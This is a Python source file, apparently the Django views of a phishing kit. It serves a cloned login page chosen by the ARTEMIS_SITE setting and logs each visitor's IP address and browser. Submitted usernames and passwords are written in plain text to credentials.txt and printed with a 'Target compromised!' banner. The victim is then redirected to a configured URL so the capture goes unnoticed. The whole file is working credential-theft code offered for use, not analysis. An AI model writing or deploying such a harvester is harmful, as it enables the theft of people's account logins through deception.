from django.shortcuts import redirect, render
from django.http import HttpResponseRedirect

import os
import json
import datetime

from .utils import analyze, colorize, TEMPLATE_PATH

redirect_URL = ''

def init_redirect_link():
    """
        if redirect_to variable is unset, load template redirect
        URL from template config JSON file from "TEMPLATE_NAME/config.json" path
    """
    global redirect_URL

    if not redirect_URL:
        template = os.environ.get('ARTEMIS_SITE', None)
        config_path = os.path.join(TEMPLATE_PATH, template, 'config.json')

        # if path exists load data from json
        if os.path.exists(config_path):
            with open(config_path, 'r') as config:
                # parse json and access redirect_to key
                redirect_URL = json.loads(config.read()).get('redirect_to')
                

def index(request):
    if request.method == 'GET':
        # retrieve and print target ip address
        target_ip, browser = analyze(request)

        timestamp = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")

        with open('client.txt', 'a') as file:
            file.writelines([
                f'[ {timestamp} ]\n',
                f'Site: {os.environ.get("ARTEMIS_SITE", "")}\n',
                f'Target IP: {target_ip}\n',
                f'Browser: {browser}\n\n'
            ])

        print(
            colorize('green', f'\nTarget connected!\n\n'),

            colorize('blue', 'Target IP:'),
            colorize('red',  target_ip + '\n'),
            
            colorize('blue', 'Browser:'),
            colorize('red', browser + '\n\n'),

            colorize('orange', 'Waiting for more...\n'),
        )

        site = os.environ.get('ARTEMIS_SITE')

        return render(request, os.path.join(site, 'index.html'))


    elif request.method == 'POST':
        # retrieve and print target ip address
        target_ip, browser = analyze(request)

        username = request.POST.get('username')
        password = request.POST.get('password')

        timestamp = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")

        with open('credentials.txt', 'a') as file:
            file.writelines([
                f'[ {timestamp} ]\n',
                f'Site: {os.environ.get("ARTEMIS_SITE", "")}\n',
                f'Target IP: {target_ip}\n',
                f'Username: {username}\n',
                f'Password: {password}\n',
                f'Browser: {browser}\n\n'
            ])

        print(
            colorize('green', f'\nTarget compromised!\n\n'),

            colorize('blue', 'Target IP:'),
            colorize('red', target_ip + '\n'),

            colorize('blue', 'Username:'),
            colorize('red', username + '\n'),

            colorize('blue', 'Password:'),
            colorize('red', password + '\n'),

            colorize('blue', 'Browser:'),
            colorize('red', browser + '\n\n'),

            colorize('orange', 'Waiting for more...\n')
        )

        # if template redirect URL is not set to REDIRECT_URL
        # load URL from template's config.json file
        init_redirect_link()
        
        return HttpResponseRedirect(redirect_URL)

